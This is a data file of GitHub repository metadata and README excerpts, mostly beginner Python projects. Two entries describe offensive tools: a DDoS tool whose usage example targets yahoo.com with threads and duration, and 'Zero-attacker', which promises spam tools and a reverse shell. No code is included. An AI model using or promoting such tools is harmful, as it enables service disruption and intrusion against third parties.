417510836;Signals-and-Systems-codes;https://github.com/pukxukxex/Signals-and-Systems-codes;Jupyter Notebook;2021-10-15T13:32:32Z;0;0;0;Signals-and-Systems-codes Some python codes that I wrote in the field of Signals and Systems during my SnS UG course in 2nd year 
417445817;World-Clock;https://github.com/nushon/World-Clock;Python;2021-10-15T09:39:29Z;0;0;0;World-Clock A python program that takes a country name as input from the user and return the time zone of that country 
417489071;Loot-Island-Scoring;https://github.com/NeilMcFarlane-gh/Loot-Island-Scoring;Python;2021-10-15T12:19:31Z;0;0;0;
417465830;AnaliseDados;https://github.com/marcelowiek/AnaliseDados;Jupyter Notebook;2021-10-15T10:54:45Z;0;0;0;AnaliseDados Este projeto é um exercício da aula de Análise de Dados ministrado pelo canal Hashtag Programação através do seu Curso Intensivo de Python, aula 2. O documento telecom_users.csv contém apenas dados fictícios e é necessário que este arquivo esteja presente no diretório para funcionamento. O projeto como um todo foi criado apenas para uso educacional. 
417490368;PythionArchive;https://github.com/JordanViknar/PythionArchive;Python;2021-10-15T12:24:15Z;0;0;0;"Pythion Tic-Tac-Toe but in Python. This is a really old French high-school projet from the beginning of 2019, and only here for archive purposes. Pythion = Python + ""Morpion"" (Tic-Tac-Toe in French) Usage : The scripts should run fine, as long as your environment fullfills the dependencies (EduPython was used to develop it, so try it as a last resort if you're French). If you want to use sound features, make sure you're running Windows and have the files  music.wav vsmusic.wav tighter.wav vstighter.wav victory.wav  ready at the root of the project. They can be any WAV files. The original files (not present in this repository) are actually from the Tetris NES OST, so get those if you want the ""proper"" experience. What version do I use ? The ""vsordi"" version makes you fight against the computer, who just simply randomly selects an available case (look, I was in high school at the time, don't complain). The other version requires a second player, and that player will be against you. Part of the soundtrack is different between versions. Oh and yeah, since this is as basic as can be : the whole game plays in the console. "
417500178;TextUtils;https://github.com/Priyangshu-Mandal/TextUtils;HTML;2021-10-15T12:58:16Z;0;0;0;
417467666;AutomacaoWebAndSearch;https://github.com/marcelowiek/AutomacaoWebAndSearch;Jupyter Notebook;2021-10-15T11:01:07Z;0;0;0;AutomacaoWebAndSearch Este projeto é um exercício da aula de Automação Web adn Search ministrado pelo canal Hashtag Programação através do seu Curso Intensivo de Python, aula 3. O documento Produtos.xlsx contém apenas dados fictícios e é necessário que este arquivo esteja presente no diretório para funcionamento. É necessário o chromedriver presente no mesmo diretório para funcionamento. 
417463396;AutomacaoProcessosSistemas;https://github.com/marcelowiek/AutomacaoProcessosSistemas;Jupyter Notebook;2021-10-15T10:45:06Z;0;0;0;AutomacaoProcessosSistemas Este projeto é um exercício da aula de Automação de Processos e Sistemas ministrado pelo canal Hashtag Programação através do seu Curso Intensivo de Python, aula 1. O documento Vendas - Dez.xlsx contém apenas dados fictícios e é necessário que este arquivo esteja presente no diretório para funcionamento. Toda esta automação foi programada para um desktop específico, portanto, pode vir a ter resultados variantes em outros computadores dependendo de suas configurações e periféricos. 
417469100;DataScience;https://github.com/marcelowiek/DataScience;Jupyter Notebook;2021-10-15T11:06:17Z;0;0;0;DataScience Este projeto é um exercício da aula de Data Science ministrado pelo canal Hashtag Programação através do seu Curso Intensivo de Python, aula 4. O documento advertising.csv contém apenas dados fictícios e é necessário que este arquivo esteja presente no diretório para funcionamento. 
417486850;Energy-Efficient-Distributed-System;https://github.com/andyboat75/Energy-Efficient-Distributed-System;Jupyter Notebook;2021-10-15T12:11:24Z;0;0;0;"Energy-Efficient-Distributed-System Detailed information on the project can be found in EEDS2021SProjectAssignment.pdf This project was done with Hasan Oguz Kinaci. Background And Motivational Scenario   Massive amounts of data are constantly generated from the growing number of Internet of Things (IoT) devices. Nowadays, sensor-based data are used in many applications, like eHealth, smart manufacturing, intelligent traffic management, smart building systems. Such systems rely on monitoring of parameters (e.g., temperature, movement, heart rate, energy consumption, power production, radiation, pressure or air quality) coming from many sensors. Managing these systems generally requires (i) sensor data collection, (ii) data processing and (iii) acting based on the obtained results. Traditionally, such processing is done by employing geographically distributed and massive data centers. Recently, edge computing has been proposed as a solution to perform near-real-time decisions in the proximity of the user. Edge analytics rely on edge nodes (e.g., Raspberry Pi, edge gateway or micro data center) that can be deployed closer to IoT sensors and devices. By keeping data analytics close to the source of data, edge nodes can minimize the latency for decision-making processes as well as to improve energy efficiency of data transmission networks1 . Furthermore, predictive analytics have a huge potential to revolutionize critical and proactive IoT systems such as accurate diagnosis of patients in eHealth, timely maintenance services and failures prevention in smart manufacturing and building systems.      However, meeting the strict latency and accuracy requirements of decision-making processes while performing predictive analytics in modern edge/IoT systems, imposes several issues. Limited (i) storage capabilities and (ii) scalability of edge nodes can hinder the accuracy of predictive analytics and timely decision-making for IoT systems. Also, users and IoT applications can require various prediction horizons (windows) as well as different accuracy thresholds.       We consider data generated by sensor-based monitoring, classified as time-series data. Based on a certain amount of historical time series and recognized patterns, it is possible to predict future values. The conclusions based on analyzed data generally assume that the future system behavior will follow a behavior (pattern or trend) from the measured past. Accordingly, we can use predictive analytics in the context of proactive decision-making.       Figure 1 represents an edge analytics model for smart building use cases. In step (1), data are collected from smart buildings. Due to the rapidly increasing amount of data generated, data can be transferred to the edge layer in step (2). Once a certain amount of data is transferred to the edge layer, the monitoring service cleans data and stores them to the limited edge storage (step 3). The available data are used in step (4) for near-real-time decision-making processes based on the results of predictive analytics, while checking the knowledge base that can be updated with dynamic user/application requirements. The knowledge base should contain recommendations on the best trade-offs between the quantity of the data and prediction accuracy as well as the most suitable forecasting methods for a particular dataset type regarding the prediction horizon. The analytics results are used to take operative decisions, e.g., commands sent to actuators in step (5). The mediator supports the edge layer and communicates with the cloud data repository for resource-demanding batch analytics (step 6)       Assignment            Analyze and determine the best settings in the edge approach for efficient decision-making         processes. The resulting recommended settings should ensure that the edge analytics         component (step 4) can select an appropriate forecasting method having both high         forecast accuracy and low latency by considering (i) target dataset type, (ii) required         prediction horizon and (iii) the most suitable range of historical data as input. We consider         the recommendations to be integrated into the knowledge base, in the future edge design.         “Which range of data and corresponding prediction horizon can ensure the best trade-off between         prediction accuracy and computation latency”, can experimentally be solved by (i) artificially         defining different prediction horizons and ranges of training data using complete datasets, (ii)         applying different forecasting methods for each of defined prediction horizons and training sets,         (iii) observing forecast accuracies and latencies (running time), and (iv) consequently, making         recommendations based on conditions and trade-offs that enable efficient decision-making, i.e.,         which forecasting method and setting can produce the best accuracy-latency trade-off regarding         prediction horizon and given dataset type.        Guidelines and details  The assignment is based on time-series data. A prediction horizon is the number of data points representing prediction length, that is, the amount of data into the future for which the forecasts are to be calculated. During the observation/experimentation phase, we assume that datasets are already complete (without missing values) and without outliers, so the forecasts can be evaluated For the sake of simplicity, the latency is considered as a time consumption or running time of the forecasting procedure. Edge predictive analytics (step 4) for decision-making are often application dependent. However, our recommendations can be related to specific datasets and observations. Edge recommended settings for efficient decision-making must be determined considering:  different patterns of time-series data (different sensor-based datasets); various forecasting methods/models that can be applied; different length of forecast horizons in the experimentation phase; a forecast accuracy measure to evaluate forecasted ranges of data points.   "
417426746;ddos-attack-tool-;https://github.com/Asjadd/ddos-attack-tool-;Python;2021-10-15T08:35:10Z;0;0;0;DDOS-attack-tools Simple DDOS tool made by ASJAD#0060 INSTALLATION PROCESS WINDOWS/LINUX $ git clone $ cd ddos-attack-tools $ pip install -r requirements.txt RUNNING IT $ python ddos.py OR % python Host Port Threads Time example:(python http://yahoo.com 80 20 5 IMPORTANT Asjad Support Server Before using somewhere else give credit #CREDIT GOES TO ASJAD#0060 BEFORE USING IT 
417537516;Drawing-App;https://github.com/AdvickV/Drawing-App;Python;2021-10-15T14:53:37Z;0;0;0;Drawing-App A fully functioning app with which you can draw using different colors and thicknesses. You can even ERASE or CLEAR your drawings too! Installation NO EXTERNAL LIBRARIES NEEDED! Usage  Drag the Circle to Draw. Choose COLOR 🎨 and THICKNESS using the Comboboxes. Click ERASE to erase, and click it again to turn it off. Click CLEAR to erase your entire drawing. Use PEN UP and PEN DOWN if you want to move your cursor(circle) to a different position without drawing.  Preview  
417507178;fastapi-users-sqlalchemy-jwt-demo;https://github.com/Georgi2704/fastapi-users-sqlalchemy-jwt-demo;Python;2021-10-15T13:20:51Z;0;0;0;fastapi-users-sqlalchemy-jwt-demo A demo for authentication with FastAPI Users using SQLAlchemy and JWT tokens. If you want to use a virtual environment first create the environment: python3 -m venv .venv source venv/bin/activate You can install the required libraries with pip. The following command will install all the required libraries for the project. pip install -r ./requirements.txt Start the server by running main.py or a hot reloading, api server: uvicorn main:app --reload --port 5000 Swagger docs/GUI at: http://127.0.0.1:5000/api/docs  
417484137;Marketing_Analytics;https://github.com/vitormarquesds/Marketing_Analytics;;2021-10-15T12:01:52Z;0;0;0;Marketing_Analytics n this project, I worked with a Food Delivery Dataset. For this project, the technology used was Python (Matplotlib, Scikit-Learn, Pandas, Numpy and Seaborn.)  ​  Was delivered a Machine Learning Model for predict clients segmentation by Food Delivery​ 
417535654;Avelord-HR;https://github.com/GordonWolf/Avelord-HR;;2021-10-15T14:47:56Z;0;0;0;Avelord-HR Software coded in Python with a Qt interface used to facilitate HR procedures such as the management of working time or facilitate the creation of monthly pay slips. Other features such as the ability to manage vacations could be added. 
417470411;Text-Extraction-from-Dataframe-Column.;https://github.com/wisky47/Text-Extraction-from-Dataframe-Column.;Jupyter Notebook;2021-10-15T11:11:05Z;0;0;0;
417508966;UR5E_robot_advanced_forward_kinematic_system;https://github.com/wq13552463699/UR5E_robot_advanced_forward_kinematic_system;;2021-10-15T13:26:30Z;0;0;0;UR5E_robot_advanced_forward_kinematic_system This folder contains the python code of UR5E's advanced forward kinematics model. By entering the angle of the joint of UR5e, the detailed coordinates of up to 48 points around the robot arm can be calculated. 
417478740;extract-cve-nvd-nist-json;https://github.com/Sengchhiv/extract-cve-nvd-nist-json;Python;2021-10-15T11:42:17Z;0;0;0;"extract-cve-nvd-nist-json Python code to extract cve details from nvd nist data feeds json files. ['cve_id','cwe','description','vulnerability_type','published_date','cve_score','attackVector',""attackComplexity"",""privilegesRequired"",""confidentialityImpact"",""integrityImpact"",""availabilityImpact"",""baseSeverity"",""authentication"",""vendor"",""product"",""version""] the code extract json file from nvd_nist from 2002 from 2021. json files must be downloaded manually from https://nvd.nist.gov/vuln/data-feeds.  change the code in year loop to choose files to extract  warning: for simplicity, any json element that has more than one child will only have the first child considered. this also applies to the string in description. (code could be altered to further this limitation) example: one cve might have more than one product, but only one first product is extracted. one cve might have various vulnerability type, but only one first type is extracted. "
417536490;syracuse;https://github.com/orjawell/syracuse;Python;2021-10-15T14:50:29Z;0;0;0;"Syracuse [Projet scolaire] Programme en python permettant de déterminer, par la conjecture de syracuse, un x en quel la conjecture s'execute tant de fois avant de tomber sur 1. Mais c'est quoi Syracause ? En mathématiques, on appelle suite de Syracuse une suite d'entiers naturels définie de la manière suivante : on part d'un nombre entier strictement positif ; s’il est pair, on le divise par 2 ; s’il est impair, on le multiplie par 3 et on ajoute 1. En répétant l’opération, on obtient une suite d'entiers strictement positifs dont chacun ne dépend que de son prédécesseur. source "
417501633;Tracklist-Scraper;https://github.com/roehrsi/Tracklist-Scraper;Python;2021-10-15T13:02:40Z;0;0;0;
417493893;list_table_sql-py;https://github.com/Dark-Athena/list_table_sql-py;Python;2021-10-15T12:36:36Z;0;0;0;"list_table_sql-py 使用python命令获得sql中的所有表或视图名称 get all table's or view's name from a sql 这个程序及其所使用的文件基于antlr4(v4.8) 和 grammar-v4 构建 this program and requirements was based on antlr4(v4.8) and grammar-v4 https://github.com/antlr/antlr4 https://github.com/antlr/grammars-v4/tree/master/sql/plsql 你可以使用它从一个合法的sql脚本中获得其表和视图名称得清单 you can use it to get a list of table’s and view's name  from a legal sql_script 在使用前，你必须先安装 ""antlr4-python3-runtime"" before use it ,you must install ""antlr4-python3-runtime"" pip install antlr4-python3-runtime   然后下载本仓库的所有文件并解压 and then download the folder of list_table_sql-py and unzip it 现在，可以开始使用了 now ,enjoy like this : from  list_table_sql import list_table_sql as t print (t('{""sql"":""select abc from def,ghi j,k.lmn o"",""mode"":""P""}')) print (t('{""sql"":""select abc from def,ghi j,k.lmn o"",""mode"":""T""}')) {""position"": [[""16"", ""18""], [""20"", ""22""], [""26"", ""30""]]} {'tablename': ['def', 'ghi', 'k.lmn']} the ""mode"" parameter defined:  T-table_list P-table_position  "
417427498;Rainbow-Recorder;https://github.com/Asjadd/Rainbow-Recorder;Python;2021-10-15T08:37:26Z;0;0;0;Rainbow Recorder   Rainbow Recorder is an easy to use to tool which record your screen   Example if you wanna get an clip of your game shot or doing some work and you want the one clip from it then where Rainbow Recorder come with it just click the start option and   your will start recording   Getting Started  Download the RainbowRecorder.exe file Download Run the file and then install the software to your desire directory  License  Rainbow Recorder is under the MIT License  Source Code  I'm not thinking to make it open source project right now if you wanna see my other open source project ahead to repositories  Preview  Developer Asjad#0060 is the Developer of this Recorder Asjad Personal Site Discord Server 
417430813;Zero-attacker;https://github.com/Asjadd/Zero-attacker;Python;2021-10-15T08:48:21Z;0;0;0;Zero Attacker   Zero Attacker is bunch of tools which we made for people.These all tools are for purpose of ethical hacking and discord tools.   Who is the Developer, Zero Attack is made by Asjad and Knight. This tool Rights only they have if anyone would try to copy it use under there name would be affected by the MIT Licence   Where is code? For now we Are not providing the source Code   Remember to use this tool on your own purpose no wrong use of it   This is still a beta version of the tools if you find any issue let us know :DD    We have 45+ stars and my account got flagged    More Stars?  As we will reach 25 stars, we will add (self bot(discord), GeoIP) As we will reach 50 stars, We will add (Facebook spammer, number spammer, reverse shell and many more ) As we reach 100 stars the code will be public  Getting Started  git clone https://github.com/AsjadOwO/Zero-attacker.git cd Zero-Attacker python -m pip install -r requirements.txt for(Windows user just run the bat file (start.bat) )  License  Zero-Tool  is under the MIT License Using it without giving us credit would lead to Breaking the License law  Preview  Developer  Asjad#0060, Dev7knight#3544 is the Developer of this Zero Attacker Contact for any kind of help  Asjad Personal Site Knight Personal Site BETA Asjad Discord Server Knight Discord Server Fucking follow us on github 2  Zero Tool     
417481937;Random-number-game;https://github.com/dithirah/Random-number-game;Python;2021-10-15T11:53:50Z;0;0;0;
417535648;FizzBuzz-repo;https://github.com/ericstran/FizzBuzz-repo;;2021-10-15T14:47:55Z;0;0;0;
417482140;Santander_Client;https://github.com/vitormarquesds/Santander_Client;;2021-10-15T11:54:40Z;0;0;0;Santander_Client In this project, I worked with a Santander Client Review Dataset. Was used Python as the prior technology. The main library for this project (Matplotlib, Scikit-Learn, Pandas, Numpy and Seaborn.)  For this project jobs, was delivered a Machine Learning Model to rate Customer Review for Santander Bank 
417495758;photo_editor;https://github.com/buraLimit/photo_editor;Python;2021-10-15T12:43:16Z;0;0;0;
417421474;SPARKIFY_POSTGRES_ETL;https://github.com/vardhaman-datascience/SPARKIFY_POSTGRES_ETL;Jupyter Notebook;2021-10-15T08:17:07Z;0;0;0;SPARKIFY_POSTGRES_ETL A startup called Sparkify wants to analyze the data they've been collecting on songs and user activity on their new music streaming app. The analytics team is particularly interested in understanding what songs users are listening to. Currently, they don't have an easy way to query their data, which resides in a directory of JSON logs on user activity on the app, as well as a directory with JSON metadata on the songs in their app. They'd like a data engineer to create a Postgres database with tables designed to optimize queries on song play analysis, and bring you on the project. our role is to create a database schema and ETL pipeline for this analysis. we ill be able to test our database and ETL pipeline by running queries  and compare our results with their expected results. Project Description In this project, we ill we working on  data modeling with Postgres and build an ETL pipeline using Python. To complete the project, we need to define fact and dimension tables for a star schema for a particular analytic focus, and write an ETL pipeline that transfers data from files in two local directories into these tables in Postgres using Python and SQL. Schema for Song Play Analysis Using the song and log datasets, you'll need to create a star schema optimized for queries on song play analysis. This includes the following tables. Fact Table songplays - records in log data associated with song plays i.e. records with page NextSong [songplay_id, start_time, user_id, level, song_id, artist_id, session_id, location, user_agent] Dimension Tables users - users in the app [user_id, first_name, last_name, gender, level] songs - songs in music database [song_id, title, artist_id, year, duration] artists - artists in music database [artist_id, name, location, latitude, longitude] time - timestamps of records in songplays broken down into specific units [start_time, hour, day, week, month, year, weekday] Project Template In addition to the data files, the project includes five files: test.ipynb displays the first few rows of each table to let you check your database. create_tables.py drops and creates your tables. You run this file to reset your tables before each time you run your ETL scripts. etl.ipynb reads and processes a single file from song_data and log_data and loads the data into your tables. This notebook contains detailed instructions on the ETL process for each of the tables. etl.py reads and processes files from song_data and log_data and loads them into your tables. You can fill this out based on your work in the ETL notebook. sql_queries.py contains all your sql queries, and is imported into the last three files above. 
417649179;2021-PyWeekend;https://github.com/see-ecuador/2021-PyWeekend;Jupyter Notebook;2021-10-15T22:06:24Z;2;2;6;
417584823;Python;https://github.com/Akshay-798/Python;;2021-10-15T17:36:02Z;0;0;0;Name = Akshay Patil Address = At post Shreeramnagar plot no 2 chopda dist-Jalgaon 
417660539;Python;https://github.com/githubforschool-420/Python;Python;2021-10-15T23:10:52Z;1;1;0;
417655733;python;https://github.com/brunobenchimol/python;Python;2021-10-15T22:41:24Z;0;0;0;Useful Python Scripts pgsql-auto-kill - Connect to PostgreSQL and kill long running sessions 
417587363;python;https://github.com/sidh321/python;HTML;2021-10-15T17:45:56Z;0;0;0;python 
417579037;python;https://github.com/kunal323/python;;2021-10-15T17:13:49Z;0;0;1;python-1 Python programming language 
417583040;python;https://github.com/ComingCL/python;Python;2021-10-15T17:29:30Z;0;0;0;
417586425;python;https://github.com/sawsenbenz/python;Python;2021-10-15T17:42:10Z;0;0;0;
417627227;python;https://github.com/salamat9/python;Python;2021-10-15T20:32:16Z;1;1;0;
417598744;Python;https://github.com/tekken699/Python;;2021-10-15T18:29:47Z;0;0;0;Python 
417618250;python;https://github.com/mazenbatrawi/python;Python;2021-10-15T19:51:25Z;0;0;0;Some python projects 
417591685;Python;https://github.com/nicollytavassii/Python;;2021-10-15T18:02:28Z;0;0;0;Python 
417664786;python;https://github.com/RakaXD/python;;2021-10-15T23:35:30Z;0;0;0;
417653096;Python;https://github.com/imesserUNWSP/Python;Python;2021-10-15T22:25:45Z;0;0;0;
417660281;Python;https://github.com/LaurentFeliciano/Python;Python;2021-10-15T23:09:14Z;0;0;0;That repository have all python programs than I use to my projects,enjoy as much as you can! 
417663623;Python;https://github.com/souhailmerroun-practice/Python;Python;2021-10-15T23:29:41Z;0;0;0;
417624625;Python;https://github.com/DAndresPeralta/Python;Python;2021-10-15T20:19:59Z;0;0;0;
417643855;python;https://github.com/phogphantom/python;Python;2021-10-15T21:40:41Z;0;0;0;
417560741;Python;https://github.com/acorreiacruz/Python;;2021-10-15T16:07:29Z;0;0;0;
417598842;python;https://github.com/MarieRoseGaiden/python;Python;2021-10-15T18:30:05Z;0;0;0;
417637834;python;https://github.com/vignesh203/python;Python;2021-10-15T21:13:39Z;0;0;0;
417569587;python;https://github.com/Ajay-stackdesign/python;Python;2021-10-15T16:39:17Z;0;0;0;
417613321;Python;https://github.com/DaniMagaiver/Python;Jupyter Notebook;2021-10-15T19:29:37Z;0;0;0;
417596214;Python;https://github.com/BolDeRice/Python;;2021-10-15T18:19:57Z;0;0;0;Python 
417666254;python;https://github.com/Halex07/python;Python;2021-10-15T23:44:02Z;0;0;0;
417654195;PythonCode;https://github.com/eddieward21/PythonCode;;2021-10-15T22:31:36Z;0;0;0;
417658476;PythonPractice;https://github.com/kushal90/PythonPractice;;2021-10-15T22:58:24Z;0;0;0;
417624766;PythonProjects;https://github.com/DevSnowin/PythonProjects;Python;2021-10-15T20:20:39Z;0;0;0;
417607146;pythonSelenium;https://github.com/Eugene2208/pythonSelenium;Python;2021-10-15T19:04:00Z;0;0;0;
417656936;pythonSnake;https://github.com/AleksaBot/pythonSnake;;2021-10-15T22:48:28Z;0;0;0;
417663151;PythonMath;https://github.com/CoffeeCodeRpt/PythonMath;Jupyter Notebook;2021-10-15T23:26:44Z;0;0;0;PythonMath Just to learn math through programming with Python 
417586312;PythonLearning;https://github.com/JackTerzi/PythonLearning;Python;2021-10-15T17:41:43Z;0;0;0;"PythonLearning This repository is going to be where I store all of my projects from the first ""Hello World"" and beyond throughout my Python learning process. I will personally use this Repo as a future reference for challenges I may have already solved but forgotten the solutions to. My goal here is to become proficient and maybe get a great job :) "
417577242;pythonProject;https://github.com/ComingCL/pythonProject;;2021-10-15T17:07:01Z;0;0;0;
417559701;PythonScraper;https://github.com/Liynx/PythonScraper;Python;2021-10-15T16:04:04Z;0;0;0;
417567648;pythonAdvanced-;https://github.com/yujunxiong20010304/pythonAdvanced-;Python;2021-10-15T16:31:50Z;0;0;0;- 
417599644;pythonStack;https://github.com/merivera73/pythonStack;;2021-10-15T18:33:12Z;0;0;0;
417632940;PythonScripts;https://github.com/pellju/PythonScripts;Python;2021-10-15T20:54:17Z;0;0;0;PythonScripts This project contains Python scripts (ast least for now) which I have been written mostly for myself. These are (and probably will be) simple because I want to save these for future usage. Scripts: moveRaws.py - Used for copying wanted RAW-images to a separate directory. List has been taken from names of jpeg files shot (the images I take are saved as CR2 and JPEG). 
417666423;PythonFlask;https://github.com/88Creative88/PythonFlask;Python;2021-10-15T23:45:07Z;0;0;0;
417617927;pythonProject;https://github.com/Evi1Cloud/pythonProject;;2021-10-15T19:49:59Z;0;0;0;
417657083;PythonProjects;https://github.com/palashbadjatya01/PythonProjects;Jupyter Notebook;2021-10-15T22:49:28Z;0;0;0;PythonProjects Working projects using python such as jupyter notebooks, dashboards etc.  
417620375;pythonProject;https://github.com/DenisChek/pythonProject;;2021-10-15T20:00:55Z;0;0;0;
417665799;PythonAutomation;https://github.com/TikiMikk/PythonAutomation;Python;2021-10-15T23:41:26Z;0;0;0;
417608206;pythonProject;https://github.com/aiperi2021/pythonProject;Python;2021-10-15T19:08:01Z;0;0;0;
417591189;PythonCalculator;https://github.com/gabrielasigolo/PythonCalculator;Python;2021-10-15T18:00:52Z;0;0;0;
417606647;PythonPractice;https://github.com/Eusuf063/PythonPractice;Python;2021-10-15T19:02:09Z;0;0;0;PythonPractice PythonPractice ⌢倠瑹潨偮慲瑣捩≥ഠ� 
417600833;PythonCoding;https://github.com/knmukund1/PythonCoding;;2021-10-15T18:38:01Z;0;0;0;
417598814;pythonProject;https://github.com/f23542/pythonProject;Python;2021-10-15T18:29:59Z;0;0;0;
417631651;pythonTest;https://github.com/Clayton7510/pythonTest;;2021-10-15T20:49:16Z;0;0;0;
417624409;pythonProject;https://github.com/Salim-Ahmedabadi/pythonProject;Python;2021-10-15T20:18:55Z;0;0;0;
417620747;PythonScripts;https://github.com/TalBendet/PythonScripts;Jupyter Notebook;2021-10-15T20:02:05Z;0;0;0;
417640597;PythonDionis;https://github.com/PythonDionis/PythonDionis;;2021-10-15T21:24:40Z;0;0;0; 👋 Hi, I’m @PythonDionis 👀 I’m interested in ML and Python3 🌱 I’m currently learning Python3,Jupyter and ML 💞️ I’m looking to collaborate on ... 📫 How to reach me https://www.linkedin.com/in/denis-filler-a7931390/  
417667882;Dev_Ed_PythonGUI;https://github.com/SciencePotato/Dev_Ed_PythonGUI;Python;2021-10-15T23:53:49Z;0;0;0;Dev_Ed_PythonGUI Learning Tkinter from Dev Ed's Video 
417578506;PythonAzureAITemplates;https://github.com/scraptechguy/PythonAzureAITemplates;Python;2021-10-15T17:11:54Z;0;0;0;PythonAzureAITemplates 
417664010;PythonPY1001;https://github.com/alexxxesss/PythonPY1001;Python;2021-10-15T23:31:34Z;0;0;0;
417584894;PythonWorkTimerDB;https://github.com/dannyely/PythonWorkTimerDB;Python;2021-10-15T17:36:23Z;0;0;0;PythonWorkTimerDB This project constructs a countdown timer that, upon completion, will insert metadata into a database about the work you've done. This version is intended to run in an IDE console. You can select how many minutes you want the timer to be, an mp3 file as an alarm, and what comments you have about each work session. Note: Make sure to change the path to the mp3 (PyTimer line 36) and path to where you want the database (PyDB line 10). Here is an example of output from prior use  For comments I use an initial code to categorize work I do (377 refers to a class code). 
417645518;pythonTicTacToe;https://github.com/AleksaBot/pythonTicTacToe;;2021-10-15T21:49:19Z;0;0;0;
417580045;pythonProject_SAV1;https://github.com/alensav/pythonProject_SAV1;PowerShell;2021-10-15T17:17:44Z;0;0;0;
417595177;PythonDataScience;https://github.com/ryan-m-3/PythonDataScience;Jupyter Notebook;2021-10-15T18:15:44Z;0;0;0;
417598005;StudiesNotes-pythonAutomatisation;https://github.com/MUH29/StudiesNotes-pythonAutomatisation;;2021-10-15T18:27:02Z;0;0;0;StudiesNotes 
417568041;python100daysofcode;https://github.com/ArnavAadi/python100daysofcode;Python;2021-10-15T16:33:17Z;0;0;0;
417636001;Python-;https://github.com/ipa9/Python-;;2021-10-15T21:06:06Z;0;0;0;
417592609;PyRemoteSQL;https://github.com/davdtheemonk/PyRemoteSQL;Python;2021-10-15T18:05:55Z;2;2;0;PyRemoteSQL  Python MySQL remote client  Basically this is a python SQL client that allows you to connect to your remote server with phpMyAdmin installed.Run SQL query commands remotely by running this script after connecting to remote server. Requirements  Py3  Other python Dependancies  pymysql time socket sys  Installation clone this respiratory git clone https://github.com/davdtheemonk/PyRemoteSQL.git cd PyRemoteSQL Usage Python3 client.py Input remote address ie. 127.0.0.1 Input remote port ie. 8080 Here are some issues still being fixed   Perfect Py module for SQL  Verifying if PHPMyAdmin is installed.  Version of Python thats compatible. I recommend Python 2.x>.  You are highly welcomed and appreciated to contribute to this project xx. 
417582305;pythonforbeginners;https://github.com/Dorian1204/pythonforbeginners;;2021-10-15T17:26:36Z;0;0;0;
417663852;pythongame;https://github.com/deltoroalberto/pythongame;;2021-10-15T23:30:55Z;0;0;0;pythongame 
417631880;pythoncode;https://github.com/mitanshi25/pythoncode;;2021-10-15T20:50:11Z;0;0;0;
417581231;Weather_forcast;https://github.com/its-nasir/Weather_forcast;Python;2021-10-15T17:22:23Z;0;0;0;Weather_forcast Python 
417620963;Python-Practice;https://github.com/Salim-Ahmedabadi/Python-Practice;;2021-10-15T20:02:49Z;0;0;0;
417575648;Python-Bode;https://github.com/Stornshado/Python-Bode;Python;2021-10-15T17:01:10Z;0;0;0;Python-Bode 
417560423;python-course;https://github.com/AmirMahdyTurani/python-course;;2021-10-15T16:06:21Z;0;0;0;
417579423;Python-Modules;https://github.com/MohamedMonder/Python-Modules;Python;2021-10-15T17:15:20Z;0;0;0;
417641227;Python-GB;https://github.com/ilyasova-olga/Python-GB;Python;2021-10-15T21:27:24Z;0;0;0;
417598669;python-problems;https://github.com/sominya/python-problems;Python;2021-10-15T18:29:31Z;0;0;0;python-problems 
417592486;python-quickforex;https://github.com/jean-edouard-boulanger/python-quickforex;Python;2021-10-15T18:05:28Z;0;0;0;quickforex 
417581545;python_patterns;https://github.com/dineshr93/python_patterns;Python;2021-10-15T17:23:41Z;0;0;0;
417645093;Function-Python;https://github.com/Hudson-Isr/Function-Python;Python;2021-10-15T21:47:05Z;0;0;0;Function-Python 
417618765;python-class;https://github.com/rough-khata/python-class;Python;2021-10-15T19:53:43Z;0;0;0;
417665572;Python-demo;https://github.com/Fuad471/Python-demo;Python;2021-10-15T23:39:59Z;0;0;0;
417568724;MasteringPython;https://github.com/MatheusAssisM/MasteringPython;;2021-10-15T16:35:50Z;0;0;0;
417587898;Algorithms_Python;https://github.com/rekilina/Algorithms_Python;;2021-10-15T17:48:05Z;0;0;0;Algorithms_Python 
417594799;test-python;https://github.com/fluentstream-sandbox/test-python;Python;2021-10-15T18:14:26Z;0;0;0;Welcome to the AWS CodeStar sample web service This sample code helps get you started with a simple Python web service using AWS Lambda and Amazon API Gateway. What's Here This sample includes:  README.md - this file buildspec.yml - this file is used by AWS CodeBuild to package your application for deployment to AWS Lambda index.py - this file contains the sample Python code for the web service template.yml - this file contains the AWS Serverless Application Model (AWS SAM) used by AWS CloudFormation to deploy your application to AWS Lambda and Amazon API Gateway. tests/ - this directory contains unit tests for your application template-configuration.json - this file contains the project ARN with placeholders used for tagging resources with the project ID  Getting Started These directions assume you want to develop on your development environment or a Cloud9 environment. To work on the sample code, you'll need to clone your project's repository to your local computer. If you haven't, do that first. You can find instructions in the AWS CodeStar user guide at https://docs.aws.amazon.com/codestar/latest/userguide/getting-started.html#clone-repo.   Create a Python virtual environment. This virtual environment allows you to isolate this project and install any packages you need without affecting the system Python installation. At the terminal, type the following command:  $ virtualenv .venv    Activate the virtual environment:  $ source .venv/bin/activate    Install the SAM CLI. For details see https://docs.aws.amazon.com/serverless-application-model/latest/developerguide/serverless-sam-cli-install.html   Start the development server:  $ sam local start-api -p 8080    Open http://127.0.0.1:8080/ in a web browser to view your service.   What Do I Do Next? If you have checked out a local copy of your repository you can start making changes to the sample code.  We suggest making a small change to index.py first, so you can see how changes pushed to your project's repository are automatically picked up by your project pipeline and deployed to AWS Lambda and Amazon API Gateway. (You can watch the pipeline progress on your AWS CodeStar project dashboard.)Once you've seen how that works, start developing your own code, and have fun! To run your tests locally, go to the root directory of the sample code and run the python -m unittest discover tests command, which AWS CodeBuild also runs through your buildspec.yml file. To test your new code during the release process, modify the existing tests or add tests to the tests directory. AWS CodeBuild will run the tests during the build stage of your project pipeline. You can find the test results in the AWS CodeBuild console. Learn more about AWS CodeBuild and how it builds and tests your application here: https://docs.aws.amazon.com/codebuild/latest/userguide/concepts.html Learn more about AWS Serverless Application Model (AWS SAM) and how it works here: https://github.com/awslabs/serverless-application-model/blob/master/HOWTO.md AWS Lambda Developer Guide: https://docs.aws.amazon.com/lambda/latest/dg/deploying-lambda-apps.html Learn more about AWS CodeStar by reading the user guide, and post questions and comments about AWS CodeStar on our forum. User Guide: https://docs.aws.amazon.com/codestar/latest/userguide/welcome.html Forum: https://forums.aws.amazon.com/forum.jspa?forumID=248 What Should I Do Before Running My Project in Production? AWS recommends you review the security best practices recommended by the framework author of your selected sample application before running it in production. You should also regularly review and apply any available patches or associated security advisories for dependencies used within your application. Best Practices: https://docs.aws.amazon.com/codestar/latest/userguide/best-practices.html?icmpid=docs_acs_rm_sec 
